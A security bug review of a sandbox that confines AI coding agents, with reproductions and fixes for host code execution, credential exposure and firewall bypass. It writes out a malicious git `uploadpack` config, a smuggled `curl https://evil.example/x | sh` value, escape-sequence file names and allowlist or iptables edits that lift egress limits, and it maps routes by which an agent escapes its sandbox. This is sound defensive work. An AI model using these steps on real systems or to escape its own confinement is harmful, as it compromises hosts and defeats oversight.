# Bugs review — 2026-10-26

- **Review date:** 2026-10-26
- **Last reviewed commit:** `bec1c57` (`bec1c5737acdc549143e2c55e4a4b945ae27a287`, main, 2026-10-18 — "Merge pull request #312")
- **Window reviewed:** everything changed since 2026-09-01 — `8f32aa1` (last commit before Sep 1) .. `bec1c57`: 200 non-merge commits, 212 files. Pre-window code the window relies on was in scope where a reviewer hit a real defect; such findings say "Introduced: … (before the window)".
- **Rule:** only defects present at `bec1c57`. Anything introduced and fixed again inside the window is not listed.
- **Method:** eight area reviewers plus a docs-vs-code reviewer, run in parallel against the diff and the code at HEAD. Each finding was then triaged; the HIGH ones were re-checked against the code by the coordinator. Hermetic suite at HEAD: 98/98 under C.UTF-8, 96/98 under en_US.UTF-8 (TST-1). Falsify corpus + `check-ledger.sh --strict`: green. All 78 integration mutation patches apply.
- **Companion:** [2026-10-26-feature-gaps-review.md](2026-10-26-feature-gaps-review.md).
- **Confidence:** CONFIRMED = reproduced, or unambiguous from the code. PLAUSIBLE = strong reasoning, not reproduced (usually needs hardware or a platform not available here); verify before fixing.
- **Citations** are by snippet, per AGENTS.md "Citing code". Scratch repro paths mentioned in entries were session-local and may no longer exist; each entry describes its repro in full.

## Fix batches (one PR per area)

| # | Area | Findings | Feature gaps folded in | Highest |
|---|---|---|---|---|
| 1 | Host-side launcher: git internals + launcher overlay | GIT-1, LNCH-1, LNCH-3 (partly); LNCH-2 deferred → PLAT-1 | GAP-12 (only: follow includes inside included files) | HIGH |
| 2 | Launcher config / env layers / credentials | ENV-1 … ENV-6 | — | HIGH |
| 3 | Container-start runtime tools (entrypoint root steps, reconciles) | RT-1 … RT-7 | stretch: GAP-1 for `link-default-ruby.sh`, `install-agent-skills.sh`, `agent-tools-reconcile.sh` | HIGH |
| 4 | Host lifecycle scripts (project-init, sync, repo, group, report) | PRJ-1 … PRJ-9, DOC-1, DOC-3 | optional: GAP-6; stretch: GAP-1 for `group.sh` | MEDIUM |
| 5 | In-container DB services | SVC-1 … SVC-3 | — | MEDIUM |
| 6 | Build / Dockerfile / tools.d / config validation | BLD-1 … BLD-7 | — | MEDIUM |
| 7 | Test harness and CI | TST-1 … TST-8 | GAP-5 (same fix as TST-2), GAP-8 (with TST-5), GAP-9 (with TST-3) | MEDIUM |
| 8 | Docs (docs-only PR) | DOC-2, DOC-4 … DOC-13 | GAP-14 (overlaps DOC-6) | MEDIUM |

Folded-in gaps are described in [2026-10-26-feature-gaps-review.md](2026-10-26-feature-gaps-review.md); each carries a matching `Fix batch:` line there. **Optional** = same files, but grows the batch; take it if the batch is small. **Stretch** = activate those files' deferred falsify targets in the same PR, so the new assertions are shown to be able to fail; it costs a mutation-score run per batch. The remaining gaps (GAP-2, 3, 4, 7, 10, 11, 13, and the rest of GAP-12) are a separate track.

Platform-specific items that need another OS or hardware to reproduce are in [2026-10-26-platform-issues.md](2026-10-26-platform-issues.md) (PLAT-1 … PLAT-4).

Duplicates merged: PRJ-2 is the same defect as DOC-1 (fix once, in batch 4); PRJ-7 is the same defect as TST-1 (fix once, in batch 7).

### HIGH — fix first

| ID | Summary |
|---|---|
| GIT-1 | The launcher's host-side `git ls-files` on an agent-controlled partial clone lazy-fetches and runs `remote.*.uploadpack` → arbitrary command on the **host** (reproduced 3/3). |
| ENV-1 | A committed `sandbox.env` can set `DOCKER_CONFIG`/`DOCKER_HOST`; `build.sh` then runs a planted `docker-buildx` CLI plugin on the host, with `GITHUB_TOKEN` (reproduced). |
| RT-1 | `link-default-ruby.sh` runs `~/.rvm/rubies/*/bin/* --version` as **root with NET_ADMIN**, after the restricted firewall is up; `~/.rvm` is agent-writable → firewall can be lifted (verified against entrypoint). |

### MEDIUM

ENV-2, ENV-3, ENV-4, LNCH-1, LNCH-2, RT-2, RT-3, RT-4, SVC-1, BLD-1, BLD-2, PRJ-1, PRJ-3, PRJ-5, DOC-1 (=PRJ-2), DOC-2, DOC-3, TST-1 (=PRJ-7), TST-2, TST-3.

### LOW

Everything else.

---

## 1. Host-side launcher: git internals

### GIT-1: Host command execution — the launcher runs `git ls-files` on an agent-controlled repo, which triggers a promisor lazy-fetch that executes `remote.*.uploadpack`
- **Status: FIXED (batch 1)** — `f3ddb69`, hardened in `1c26919` (`GIT_NO_LAZY_FETCH=1 GIT_ALLOW_PROTOCOL=none`; test G28).
- Severity: HIGH — Confidence: CONFIRMED (reproduced 3/3, host-side)
- Location: `sandbox.sh: git_dirs_in()` — `mapfile -d '' -t links < <(git -C "$top" -c core.fsmonitor=false -c safe.directory='*' --git-dir="$g" --work-tree="$top" ls-files -s -z 2>/dev/null)`
- Introduced: 91fac80 (gitlink/submodule discovery via `ls-files`, within the review window)

**What's wrong.** The whole point of the git-internals overlay is that *nothing
the agent can write under `.git` may cause the HOST's git to run a program*. But
`git_dirs_in()` — invoked by `launcher_ro_overlay()` on the host, at every
`sandbox.sh` launch, against every git directory it finds under a writable mount,
**before** docker runs and before any read-only overlay exists — executes a live
`git ... ls-files -s` with `--git-dir`/`--work-tree` pointed at that repository.
The code's only defense is `-c core.fsmonitor=false`, and the comment states the
belief explicitly:

> "The index is read with git, fsmonitor off, so a config tampered with before
> this protection existed runs nothing here" … "ls-files runs nothing from a
> repository's config once fsmonitor is off."

That claim is false. In a **partial clone** (`extensions.partialClone`) with a
**sparse index** (`index.sparse` / sparse-checkout cone), `ls-files -s` must
expand the sparse index, which requires reading the tree object of a collapsed
directory. If that tree object is absent (a promisor object), git performs a
**lazy fetch** from the promisor remote, which runs the transport command the
repo's own config names — `remote.origin.uploadpack` (or an `ext::`/`file://`
transport). `core.fsmonitor=false` does nothing about this path.

**Failure scenario (within the sandbox threat model).** The agent, in any
container session, has write access to objects/refs/worktree of every repo under
a writable mount, and can `git init` brand-new nested repos (which are not
protected until the *next* launch). In session 1 it plants a nested repo
configured as a partial clone + sparse index with
`remote.origin.uploadpack = "<any command>; false"` and a missing tree object.
Nothing under `.git` shows in `git status`/`git diff` on the host, and the
launcher that protects repos runs only at launch. On the **next** launch,
`git_dirs_in()` discovers that repo and runs `ls-files -s` on it → lazy fetch →
the agent's command executes **as the host user, outside the container, before
the firewall**. The same fires on the *first* launch that protects a repo whose
config was tampered with before protection existed (exactly the case the comment
claims is safe), and on any partial clone the user themselves obtained with a
malicious `uploadpack`.

**Evidence.** Deterministic repro (3/3) calling `sandbox.sh`'s own
`git_dirs_in` on a planted `proj/evil` repo:
```
=== calling git_dirs_in (the launcher's own discovery) ===
EXECUTED during git_dirs_in:
uid=1000(ihudak) gid=1000(ihudak) groups=1000(...),459(docker),...
```
The planted repo:
```
git init evil; sparse-checkout init --cone --sparse-index; sparse-checkout set a
rm -f .git/objects/<b-tree>              # make the collapsed dir's tree a promisor miss
git config core.repositoryformatversion 1
git config extensions.partialClone origin
git config remote.origin.promisor true
git config remote.origin.url  file://.../nowhere
git config remote.origin.uploadpack "id > PWNED; false"
```
`id`'s output landed in `PWNED` every run. The exact launcher invocation
(`-c core.fsmonitor=false -c safe.directory='*' --git-dir=... --work-tree=...
ls-files -s -z`) is what ran it. `safe.directory='*'` additionally makes git
willing to do this even on a repo owned by another uid.

**Fix direction.** Run that `ls-files` (and any launcher git call that touches a
repo's live config) with lazy fetch disabled — set `GIT_NO_LAZY_FETCH=1` in its
environment (verified: with `GIT_NO_LAZY_FETCH=1` the `uploadpack` command does
not run). Belt-and-braces: also neutralise transports with
`GIT_ALLOW_PROTOCOL=` (empty) / `-c protocol.allow=never` and/or read gitlinks
without expanding the sparse index. The misleading comment in `git_dirs_in`
should be corrected — `core.fsmonitor=false` is not sufficient to make
`ls-files` inert on an untrusted repo.



## 1. Host-side launcher: read-only launcher overlay and mount verification

### LNCH-1: An agent can plant any number of fake launchers or unlistable directories, and each one adds a bind mount, warnings and launch time with no upper limit
- **Status: FIXED (batch 1)** — `643d9bd`, `c5f6fcc` (`SANDBOX_LAUNCHER_MAX`, shared link budget naming what it skipped; test T46).
- Severity: MEDIUM — Confidence: CONFIRMED
- Location: `sandbox.sh: \`launcher_dirs_in()\`` (matches any directory holding `sandbox.sh` + `sandbox-common.sh`, and any unlistable directory the agent can reach). Also `sandbox.sh: \`launcher_ro_overlay()\``: the depth loop, the `ro_dsts` skip scan, and the per-launcher link scan `if (( ++nl > 200 )); then`.
- Introduced: the overlay and unreadable handling (window). The 200-links-per-launcher cap and T38 came later in the window and do not close this.
- What's wrong: AGENTS.md (Mount layout) says: "What the agent can write cannot make the check noisy or slow: links that sit in such an inner writable bind are not walked, a launcher that is itself a writable mount root is not walked, and at most 200 links per launcher are". The cap is **per launcher**, and the agent decides how many launchers there are. Two empty files make any directory in the writable project tree count as a launcher. That costs the agent nothing, and the host never runs it. Each such directory then gets all of the following on every later launch:
  - its own read-only overlay (and pins),
  - a `READ-ONLY:` line,
  - a manifest entry,
  - up to 200 link walks, each printing a `WARNING:`.
  `chmod 000` directories do the same through the unreadable-candidate path: one `:ro` bind plus one `WARNING` each. The git half has `SANDBOX_GIT_MAX` for exactly this concern ("the agent can make repositories and unlistable directories"). The launcher half has no such cap. Its loops are also quadratic: each candidate rescans `ro_dsts`, and the depth loop rescans every candidate.
- Failure scenario: during one session the agent runs `for i in $(seq 1000); do mkdir -p /workspace/proj/junk/l$i; touch /workspace/proj/junk/l$i/sandbox{,-common}.sh; for j in 1 2 3 4 5; do ln -s ../f /workspace/proj/junk/l$i/k$j; done; done`. The user's next launch then:
  - spends about 78 s in sandbox.sh before `docker run`,
  - adds 1001 `:ro` binds, about 50 s more per start on Docker Desktop by the doc's own 50 ms/bind figure,
  - prints 5000 `WARNING:` blocks.
  The real warnings, such as a genuine launcher link into a writable tree, are buried in that flood, and users learn to ignore the output.
- Evidence: reproduced. The fake-docker harness at `/tmp/claude-1000/-home-ihudak-dev-ai-tools-ai-containers/002098a4-b5ad-4f57-bc49-6373376abc59/scratchpad/launcher/harness.sh` copies the setup of `tests/test-launcher-dir-ro.sh`.
  - scratch script t1: baseline `args=66 warn=0`. With N=300, `args=668 warn=1500 ro=301`. With N=1000, `args=2068 warn=5000 ro=1001 ms=77799`.
  - scratch script t2 (200 `chmod 000` dirs): `ro-binds=202 warn=200 ms=3930`.
- Fix direction:
  - Put a total cap on launcher and unreadable overlays and on walked links per launch, like `SANDBOX_GIT_MAX`, and refuse the launch past it, naming where the overflow is.
  - Prune the launcher's inner writable binds (output dirs) from the `find`, instead of walking them and filtering afterwards.
  - Correct the AGENTS.md sentence.

### LNCH-2: The one anchor on `$HOME`'s filesystem stands in for launcher mounts on every other filesystem, so a non-preserving project filesystem is refused instead of skipped
- **Status: DEFERRED (batch 1, 2026-10-26)** — needs a reproduction on Docker Desktop + WSL2 before any change; every candidate fix weakens the swap check. Tracked as PLAT-1 in [2026-10-26-platform-issues.md](2026-10-26-platform-issues.md).
- Severity: MEDIUM — Confidence: PLAUSIBLE (reasoned, not reproduced: needs Docker Desktop + WSL2)
- Location: `entrypoint.sh: \`verify_launcher_mounts()\``, which compares `got="$(stat -c '%d:%i' /run/ai-launcher ...` once against `AI_LAUNCHER_ANCHOR` and then requires every manifest entry to match. The anchor is set in `sandbox.sh` by `_launcher_verify_dir="$HOME/.ai-containers/.verify-$$-$RANDOM"`.
- Introduced: a5e9948 / 7a4d5ae
- What's wrong: the anchor proves that the filesystem holding `~/.ai-containers` keeps device:inode across a bind. Nothing proves it for the filesystem holding each launcher source. When the project sits on a different filesystem that does not keep device:inode, the anchor matches, every entry mismatches, and the entrypoint says `ERROR: a launcher mount changed ... refusing to start`. That is a false accusation of a concurrent-container swap, it fires on every launch, and the user has nothing to act on.
- Failure scenario: Docker Desktop with WSL2 integration, `$HOME` on the distro's ext4, and the project on `/mnt/c/...` (drvfs). AGENTS.md itself discusses this setup ("a WSL drvfs path under /mnt/<drive>"). The daemon reaches `/mnt/c` through its own drvfs/9p mount in the docker-desktop distro, which is a different superblock with a different `st_dev`. The ext4 anchor survives, so verification runs. Every `.ai-containers` overlay is then reported as swapped, and the launch never starts. The same applies to any host where `$HOME` is passed through natively but some other source path goes through a file-sharing layer.
- Evidence: from the code, a single anchor gates every entry, and the manifest entries can come from any filesystem. Case 460 probes only one scratch directory, so it cannot catch this.
- Fix direction: anchor per device. For each distinct source `st_dev`, record one reference directory on that filesystem (for example the mount root, or the first source seen on that device). Skip with the NOTE only the entries whose reference does not survive the bind. Alternatively, on a mismatch, check the device of the mount root that holds the entry before calling it a swap.

### LNCH-3: Agent-chosen paths are printed raw to the host terminal
- **Status: PARTLY FIXED (batch 1)** — the two refusal listings use `%q` (`c5f6fcc`); the remaining messages are open.
- Severity: LOW — Confidence: CONFIRMED (found while fixing batch 1, 2026-10-26; shown with T46's escape fixture)
- Location: the `WARNING:`/`NOTE:`/`READ-ONLY:` lines throughout `sandbox.sh: \`launcher_ro_overlay()\`` and `git_dirs_in()`'s callers that print `%s` with a path found by scanning a writable mount — e.g. `printf 'WARNING: launcher link %s leads somewhere the agent can change:\n' "$f"`.
- What's wrong: those paths are names the agent chose. A directory or link named with terminal escape sequences (`$'\e]0;…\a'`, OSC 52 clipboard writes, cursor movement) is written verbatim to the host's terminal on the next launch, where it can retitle the window, hide or rewrite the warnings around it, or on terminals that honour OSC 52 set the clipboard.
- Failure scenario: the agent runs `mkdir -p "/workspace/proj/x"$'\e[2K\e[1A'` next to a real launcher link it wants unnoticed; the next launch's WARNING for that link is overwritten on screen.
- Evidence: T46 (`tests/test-launcher-dir-ro.sh`) plants `z$'\e]0;pwned\a'`; with `%s` the refusal carried the raw ESC (`^[]0;pwned^G`). The two refusal listings (`SANDBOX_LAUNCHER_MAX`, `SANDBOX_GIT_MAX`) now use `%q` (batch 1); every other site still prints raw.
- Fix direction: one helper that renders an agent-reachable path for the terminal (`%q`, or control characters replaced), used by every launcher message that prints a scanned path; a test that plants an escape in each message class.


## 2. Launcher config, env layers and credentials

### ENV-1: A committed sandbox.env can still run code on the host. `env_key_denied` covers shell keys only, and `load_env_defaults` exports every other key to docker and git
- Severity: HIGH (raised from MEDIUM in triage: host code execution from a file AGENTS.md calls inert, committed data). Confidence: CONFIRMED (reproduced)
- Location: `sandbox-common.sh: \`env_key_denied()\``, `sandbox-common.sh: \`load_env_defaults()\``
- Introduced: the deny-list approach predates the window. The window widened it (ca44e38, 987efac) but kept it limited to shell and loader keys.
- What's wrong: AGENTS.md and the `load_env_defaults` header say sandbox.env is "designed to be COMMITTED and shared". They say parsing plus the deny-list keeps it inert data ("These files configure the launcher, never the shell"). But any key not on the deny-list is `export`ed into the environment of every tool that build.sh, sandbox.sh and repo.sh run. The docker CLI reads its own keys from that environment:
  - `DOCKER_CONFIG=<dir>`: docker loads CLI plugins from `<dir>/cli-plugins/` ahead of the system ones. `docker build` is now `docker buildx build`, so a committed `docker-buildx` file runs on the host as the user. It also inherits `GITHUB_TOKEN`, which build.sh exports for `--secret id=github_token,env=GITHUB_TOKEN`.
  - `DOCKER_HOST=tcp://…` / `ssh://…` (or `DOCKER_CONTEXT`): the build, its BuildKit `github_token` secret, and every `-e` the launch passes (`COPILOT_GITHUB_TOKEN`, `GITHUB_PERSONAL_ACCESS_TOKEN`) go to a daemon the committer picks.
- Failure scenario: a project tracks `.ai-containers/` (the documented "version the portable config" mode). A PR adds `DOCKER_CONFIG=./ci` to sandbox.env and a `ci/cli-plugins/docker-buildx` file. In review it looks like config, which is exactly the BASH_ENV reasoning the code gives. The next `./build.sh` (or `./runme.sh`) runs the file.
- Evidence: in a scratch copy of HEAD (`git archive`), sandbox.env held `IMAGE_NAME=pwn-test` and `DOCKER_CONFIG=./evil`, and `evil/cli-plugins/docker-buildx` was a script that prints and exits. Running `./build.sh` printed `PWNED: fake buildx ran as ihudak args: buildx build --build-arg … --secret id=github_token,env=GITHUB_TOKEN … -t pwn-test …` (docker 29.7.2).
- Fix direction: give sandbox.env/sandbox.local.env an allow-list of the keys the launcher actually reads (IMAGE_NAME, AI_CONTAINER_*, CONTAINER_*, SANDBOX_*, EXTRA_MOUNTS, REPOS, the *_PATH pointers, …). If that is not done, at least deny `DOCKER_*`, `BUILDX_*`, `BUILDKIT_*`, `GIT_*` and `SSH_*`.

### ENV-2: repo.sh pastes SANDBOX_UID/SANDBOX_GID unvalidated into the `bash -c` scripts its seed containers run as root
- Severity: MEDIUM. Confidence: CONFIRMED (reproduced with a fake docker)
- Location: `repo.sh: \`host_uid="${SANDBOX_UID:-$(id -u)}"\``. The value is used in `seed_from_path` (`-c "cp -a /src/. /dst/ && chown -R ${host_uid}:${host_gid} /dst"`), `sync_from_path` and `sync_from_git` (`chown -R '"${host_uid}:${host_gid}"' /dst'`).
- Introduced: the code predates the window. The window added the numeric/range check (`must be numeric ids from 0 to 4294967294`) to `sandbox.sh: \`launcher_ro_overlay()\`` only, and AGENTS.md tells users to export the same values for repo.sh.
- What's wrong: repo.sh sources sandbox-common.sh, so SANDBOX_UID comes from the environment or from a committed sandbox.env. It is spliced into script text without validation. `seed_from_git` passes it safely as `"$2"`, but the other three paths do not. `sync_from_git` runs that script with the host's `~/.ssh` mounted (`-v "$HOME/.ssh":/root/.ssh-host:ro`) and unrestricted network.
- Failure scenario: sandbox.env contains `SANDBOX_UID=1000 /dst; curl -s https://evil.example/x | sh; true`. The next `./repo.sh add|sync|reset` runs the payload as root in the seed container. For a git repo that container holds the host's SSH private keys.
- Evidence: with `REPO_BACKEND=volume ./repo.sh add demo <dir>` and a fake docker, the captured `-c` script was `cp -a /src/. /dst/ && chown -R 1000 /dst; curl -s https://evil.example/x | sh; true:1000 /dst`.
- Fix direction: validate host_uid/host_gid in repo.sh with the same `^[0-9]{1,10}$` / ≤4294967294 rule. Better still, pass the value as a positional argument (`"$2"`), as `seed_from_git` already does.

### ENV-3: Tool config and credential dirs that are symlinks get copied as symlinks, so the "group copy" mounts the host's real directory read-write
- Severity: MEDIUM. Confidence: CONFIRMED (reproduced with a fake docker)
- Location: `sandbox.sh: \`cp -a "$HOME/$_cdir" "$group_root/$_cdir"\`` (tools.d `config_dir` seeding, multi-path loop added in the window). Also `sandbox-common.sh: \`_copy_group_slice()\`` (`cp -a "$from" "$dst/$p"`, which gained `.aws .azure .kube` in the window), together with `sandbox.sh: \`add_mount_if_exists()\``, which calls `resolve_path` and follows the link.
- What's wrong: `cp -a` keeps a top-level symlink, so the group gets a symlink pointing at the host directory. `add_mount_if_exists` then resolves it and bind-mounts the host's real directory `:rw`. That breaks two documented promises: "a sandboxed agent never writes to the developer's real host config" (tools.d) and "a container can no longer write the developer's real AWS/Azure credentials" (.aws/.azure/.kube). Dotfile managers and hand-made links (`~/.aws -> ~/Dropbox/aws`, `~/.config/dtctl -> ~/dotfiles/…`) are common. The tools.d seeding runs for any existing group the first time the tool is enabled, not only for `from:host`. With a relative link (GNU stow), the copied link dangles instead: the mount is skipped with a WARNING and the seed is retried on every launch.
- Failure scenario: `~/.aws` is a symlink to `/x/dotfiles/aws`, `aws-cli=ON`, and the group is bootstrapped `from:host`. The run args contain `-v /x/dotfiles/aws:/home/<u>/.aws:rw`, which is the host's real credentials, writable by the agent. The same happens with `dtctl=ON` and a symlinked `~/.config/dtctl`.
- Evidence: in a scratch HOME with `.aws` and `.config/dtctl` as absolute symlinks, the captured docker args held `…/symrepro/dotfiles/aws:/home/ihudak/.aws:rw` and `…/symrepro/dotfiles/dtctl:/home/ihudak/.config/dtctl:rw`. `~/.ai-containers/default/.config/dtctl` was a symlink to the host directory.
- Fix direction: copy the link's target, not the link (`cp -RL`, or `cp -a "$from/." "$dst/$p/"` after `mkdir`). Before mounting, refuse or warn when a group path is a symlink leading outside the group root.

### ENV-4: When the host user is root, or SANDBOX_UID=0, the agent shell is root, and restricted mode's allowlist becomes agent-writable
- Severity: MEDIUM (needs a root host user or an explicit SANDBOX_UID=0). Confidence: CONFIRMED from code in triage — `setup_sandbox_user()` finds UID 0 via `getent passwd "$uid"` and adopts `root`; nothing refuses it. Not run end-to-end.
- Location: `sandbox.sh: \`launcher_ro_overlay()\`` accepts 0 (`must be numeric ids from 0 to 4294967294`); `-e SANDBOX_UID="${SANDBOX_UID:-$(id -u)}"`; `entrypoint.sh: \`setup_sandbox_user()\``; `exec capsh --drop=cap_net_admin,cap_net_raw --user="$sandbox_user"`.
- What's wrong: AGENTS.md describes a "non-root agent shell". The capability reasoning relies on `capsh --user=` clearing the capability sets on the root→user setuid ("the agent shell ends up with no capabilities at all"). If sandbox.sh runs as root (a root WSL distro, a root CI box, `sudo ./sandbox.sh`), `id -u` is 0. The UID-0 user already exists, the name matches, and capsh switches 0→0, so only NET_ADMIN/NET_RAW leave the bounding set. The agent keeps CAP_DAC_OVERRIDE, CAP_KILL and the rest, and it owns every root-owned file. In restricted mode that includes `/tmp/allowlist-cidrs.txt` and `/tmp/allowlist-domains.txt`, which the root refresh loop re-reads every 60 s and loads into the ipset. Writing `0.0.0.0/1` and `128.0.0.0/1` there opens all egress with no NET_ADMIN needed. The agent can also kill the capture daemon.
- Failure scenario: a root host user runs `./sandbox.sh restricted`. The agent appends two CIDRs to /tmp/allowlist-cidrs.txt, and within 60 s egress is unrestricted.
- Evidence: entrypoint and refresh code paths as cited. `refresh-ipset-allowlist.sh` runs `ipset add "$tmp_v4" "$line"` for each CIDR line, on a loop.
- Fix direction: refuse SANDBOX_UID=0 / SANDBOX_GID=0 in the launcher (and in the entrypoint, as defence in depth), or map a root host user to a fixed non-root UID with a warning.

### ENV-5: `host_checkout_preflight` never runs for the all-CRLF checkout it was written for, and it does not scan the baked `services.d/*.sh`
- Severity: LOW. Confidence: CONFIRMED (reproduced)
- Location: `host-preflight.sh: \`host_crlf_files()\`` / `host_checkout_preflight()`, called after the caller has already been parsed and has sourced sandbox-common.sh and friends.
- What's wrong: the header says it "catches a checkout made before" `.gitattributes`, and AGENTS.md says it "refuses a CRLF script … (a Windows-side checkout)". In such a checkout every script is CRLF, so the shebang or the first line fails before the preflight can print its explanation. The guard only works for a tree where just some non-sourced files are CRLF. Separately, `services.d/*.sh` is COPYed into the image (`COPY services.d /etc/ai-containers/services.d`) but is not in the scanned set (`"$dir"/*.sh "$dir"/Dockerfile* … tools.d/*.conf allowlist-*.d/*.txt`), so a CRLF adapter gets baked and fails at runtime.
- Evidence: in a scratch copy with every `*.sh` converted to CRLF, `./sandbox.sh restricted` gave `env: 'bash\r': No such file or directory`, `bash ./sandbox.sh restricted` gave `line 2: set: pipefail: invalid option name`, and `./build.sh` gave the same `env` error. The preflight's message never appeared.
- Fix direction: reword the docs and header to the case it does cover (an individually edited fragment, descriptor or Dockerfile). Add `services.d/*.sh` (and `migrations/*.sh`) to the scan.

### ENV-6: A committed container.env can copy any host environment variable into the agent's shell with a bare `NAME` line
- Severity: LOW. Confidence: CONFIRMED (from code; documented docker behaviour)
- Location: `sandbox.sh: \`container_env_filter()\``. A bare NAME is forwarded "for docker to look up in this environment".
- What's wrong: the filter treats container.env as written by "whoever can commit to the project", yet it forwards a bare `GITHUB_TOKEN`, `AWS_SECRET_ACCESS_KEY` or `ANTHROPIC_API_KEY` line. docker fills these from the launching shell, so a host secret the launcher deliberately does not forward (build.sh's `GITHUB_TOKEN`, for example) reaches the agent. The agent can then use it or send it out through any allowlisted host. Only names the launcher passes with `-e` are refused.
- Fix direction: refuse bare names, or let them through only for names on an explicit allow-list (or behind an opt-in such as `SANDBOX_ENV_PASSTHROUGH=1` set in sandbox.local.env, never in a committed file).


## 3. Container-start runtime tools

### RT-1: link-default-ruby.sh runs agent-writable binaries as root, before the capability drop, so the restricted firewall can be lifted
- Triage: re-verified — in the `restricted)` arm of entrypoint.sh, `apply_restricted_firewall` runs first and `link_default_ruby` later calls the script with no `runuser`, before `exec capsh`; the script's `"$bin_dest/$b" --version` executes the symlinked rvm binaries.
- Severity: HIGH — Confidence: CONFIRMED (the execution is reproduced; that it runs as root is read from entrypoint.sh)
- Location: `link-default-ruby.sh: \`"$bin_dest/$b" --version >/dev/null 2>&1 && continue\``, called from `entrypoint.sh: \`link_default_ruby()\`` (`env RUBY_VERSIONS=... bash /usr/local/bin/link-default-ruby.sh` with no runuser)
- Introduced: 08ea799 (2026-08-05, before the window, but every container start still runs it)
- What's wrong: `link_default_ruby` runs as root in all three modes. In restricted mode the firewall is already up and the container still holds NET_ADMIN/NET_RAW. The script's verify step runs `ruby`, `gem`, `bundle`, `rake`, `irb` and `erb` with `--version`. Each of those is `~/.rvm/rubies/<default>/bin/<b>`, or wherever the agent-controlled `rubies/default` symlink leads. `~/.rvm` is the group's named volume, owned by the sandbox UID and writable by every agent in every container of that group.
- Failure scenario: an agent in any container of group G replaces `~/.rvm/rubies/ruby-3.3.6/bin/ruby` (or repoints `rubies/default`) with a script. On the next start of any restricted container in G, that script runs as root with NET_ADMIN, before `exec capsh`. It can run `iptables -P OUTPUT ACCEPT; iptables -F` or `ipset add`, or fork a root daemon that outlives the handover. The agent shell then has unrestricted egress while the banner says restricted. The planted binary is also the one that gets linked into `/usr/local/bin`, so a later `docker exec` as root that runs `ruby` executes it too.
- Evidence: I planted a `ruby` that logs `id -u`, then ran `RUBY_VERSIONS=3.3.6 bash link-default-ruby.sh <home> <dest>`. The log shows `planted ruby ran as uid=1000 args=--version`: the script executes whatever it finds there. In the entrypoint the same script runs as uid 0.
- Fix direction: never execute anything from `~/.rvm` as root. Run the `--version` probe as the sandbox user (`runuser -u "$sandbox_user" -- "$bin_dest/$b" --version`), or move the verify-and-repoint decision into rvm-reconcile.sh, which runs as the user, and keep root to `ln` only.

### RT-2: install-agent-skills.sh's stamp ignores which agents are enabled, so a newly enabled agent never gets skills
- Severity: MEDIUM — Confidence: CONFIRMED (reproduced)
- Location: `install-agent-skills.sh: \`current_stamp()\`` and `main()`'s `[ "$(cat "$STAMP" 2>/dev/null)" = "$want" ] && exit 0`
- Introduced: before the window (the file was touched in f028ce0)
- What's wrong: the stamp holds only `name=<tool version>`. `AI_AGENTS_ENABLED` is not part of it. The stamp lives in `~/.agents`, which is group-mounted and so shared by every project in the group.
- Failure scenario: project A (claude-code only) starts first in group G and writes `dtctl=0.25.0` to the stamp. Project B in G enables copilot, or A later turns copilot ON. Every later start sees an identical stamp and exits, so `dtctl skills install --for copilot` never runs. Copilot never gets the dtctl/dtmgd skills, silently, until a tool's version changes.
- Evidence: I used a fake `dtctl` that logs its arguments. The first run with `AI_AGENTS_ENABLED=claude-code` logged `--cross-client` and `--for claude`. The second run with `claude-code,copilot` printed nothing and logged no `--for copilot` call.
- Fix direction: include the sorted `AI_AGENTS_ENABLED` set in the stamp. Better still, record a stamp per agent, so a group shared by projects with different agent sets is not reinstalled on every alternation.

### RT-3: installed uv tools die when the image's Python changes, and the presence check never repairs them
- Severity: MEDIUM — Confidence: CONFIRMED (mechanism reproduced with a pyenv-style shim; not run in an image)
- Location: `agent-tools-reconcile.sh: \`install_uv()\`` — `if [[ -x "$UV_TOOL_BIN_DIR/$bin" ]]; then log "$bin already present"; return 0; fi`
- Introduced: 23e6ad6 (before the window). The window adds mkdocs and the fallback on top of it (17f7ca5, 69c3463).
- What's wrong: the first attempt uses the image's Python through pyenv's shims, and uv links the tool venv's `bin/python` to the versioned path behind the shim (`/opt/pyenv/versions/3.15.0/bin/python3`). `~/.ai-tools` outlives the image and is shared by every project in the group. Each build takes pyenv's newest patch release (`Dockerfile: \`sort -V | tail -1\``). So after a `./build.sh --no-cache` that picks up 3.15.1, or in a sibling project whose image was built on another date, that path no longer exists. The entry point in `uv/bin` is still an executable file, so `-x` passes and the reconcile logs "already present" for ever.
- Failure scenario: graphify and mkdocs are installed against 3.15.0. The image is rebuilt and now ships 3.15.1. Running `graphify` gives `bad interpreter: No such file or directory`. On every start the reconcile reports "graphify already present" and `link-agent-tools.sh` links the dead binary.
- Evidence: in my scratch area I ran `uv venv --no-managed-python` with a shim (`exec <dir>/pyv/versions/3.13.0/bin/python3`) first on PATH. `bin/python` became a link to `.../pyv/versions/3.13.0/bin/python3`. After `rm -rf pyv`, `[[ -x tool ]]` was still true, and running the tool failed with `bad interpreter` (rc 126).
- Fix direction: make the presence check prove the tool runs, for example that its venv's `bin/python` resolves or `"$UV_TOOL_BIN_DIR/$bin" --version` succeeds. If it does not, reinstall with `uv tool install --reinstall`, which then goes through the same previous-minor fallback.

### RT-4: the previous-minor fallback reads the PROJECT's Python, not the image's
- Severity: MEDIUM — Confidence: CONFIRMED for `uv python find` (reproduced); PLAUSIBLE for the pyenv-shim effect on the first attempt
- Location: `agent-tools-reconcile.sh: \`py="$(uv python find --no-managed-python 2>/dev/null)"\``
- Introduced: 69c3463 (in the window)
- What's wrong: the reconcile runs in the entrypoint's working directory. That is `-w "$workdir"`, the project primary, and runuser keeps it. `uv python find` honours a `.python-version` and a `.venv` in that directory. `uv tool install` does not; I checked, and it ignores `.python-version`. So the two disagree. AGENTS.md says the retry version is "computed from the image's".
- Failure scenarios:
  - (a) The project has `.python-version` = `3.12`, which is very common, and the image only has 3.15. `uv python find` fails with "No interpreter found for Python 3.12", `major` stays empty, no retry happens, and graphify/mkdocs fail. This is exactly the wheel-lag case the fallback exists for.
  - (b) The project has a `.venv` on 3.13. The probe returns `.venv/bin/python`, and the retry runs on 3.12 instead of 3.14.
  - (c) Plausible: pyenv's `python3` shim also honours that `.python-version`. With a version pyenv lacks, the shim errors, and the first attempt's discovery skips past it, possibly to Ubuntu's own `/usr/bin/python3`, or to nothing.
- Evidence: in a scratch dir holding a `.venv`, `uv python find --no-managed-python` printed `<dir>/.venv/bin/python`. With `.python-version`=3.11 it printed `error: No interpreter found for Python 3.11 ...` (rc 2). `(cd / && uv python find --no-managed-python)` printed `/usr/bin/python3`. The hermetic test's fake `uv` ignores the cwd, so it cannot see this.
